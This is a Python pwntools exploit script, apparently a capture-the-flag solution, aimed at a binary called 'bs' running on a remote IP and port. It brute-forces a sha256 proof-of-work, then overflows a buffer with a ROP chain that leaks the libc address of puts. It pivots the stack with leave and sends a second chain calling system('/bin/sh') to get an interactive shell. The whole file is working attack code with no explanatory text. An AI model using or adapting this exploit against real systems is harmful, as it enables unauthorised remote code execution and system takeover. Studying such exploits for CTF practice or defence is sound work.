#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import hashlib
import itertools
import string
import os
#import time
r=remote("47.91.226.78", 10005)
#r = process("./bs",env = {'LD_PRELOAD':'./libc.so.6'})
elf = ELF("./bs")
libc = ELF("./libc.so.6")



def proofwork():
  r.recvuntil('sha256(xxxx+')
  a=r.recvline()
  print a
  proof=a.split(" ")[-1]
  x=a.split(")")[0]
  proof=proof.strip()
  print r.recvuntil("xxxx:\n")
  for i in itertools.product(string.ascii_letters+string.digits,repeat=4):
    test="".join(i)+x
    k=hashlib.sha256()
    k.update(test)
    if k.hexdigest()==proof:
      print "find"
      r.sendline("".join(i))
      break
proofwork()
     




main=0x4009e7
pop_rdi = 0x400c03  #pop rdi ; ret
pop_rsi = 0x400c01  #pop rsi ; pop r15 ; ret
read_plt = elf.plt['read']
#atoi_got = elf.got['atoi']
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
buf = 0x602f00
leave = 0x400955

log.info("read_plt addr: " + hex(read_plt))
log.info("puts_got addr: " + hex(puts_got))
log.info("puts_plt addr: " + hex(puts_plt))

payload = p64(buf) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt)
payload += p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(buf+0x8) + p64(16) + p64(read_plt) + p64(leave)


print r.recvuntil("How many bytes do you want to send?\n")
#pause()
r.sendline(str(6128))
#r.sendlineafter('send?\n', str(6128))
#pause()
r.send("a"*4112 + payload + "a"*(6128-4112-len(payload)))

r.recvuntil("It's time to say goodbye.\n")
#print r.recvline()
#libc.sym['puts']
bin_sh_offset = libc.search('/bin/sh').next()
system_offset = libc.sym['system']
libc_base=u64(r.recvline()[:6]+"\x00\x00") - libc.sym['puts']
log.info("puts_libc_offset addr: " + hex(libc.sym['puts']))
log.info("system_offset addr: " + hex(libc.sym['system']))
log.info("bin_sh_offset addr: " + hex(bin_sh_offset))
log.info("libc_base addr: " + hex(libc_base))

system = libc_base + system_offset
binsh = libc_base + bin_sh_offset

r.sendline(p64(pop_rdi)+p64(binsh)+p64(system))

r.interactive()


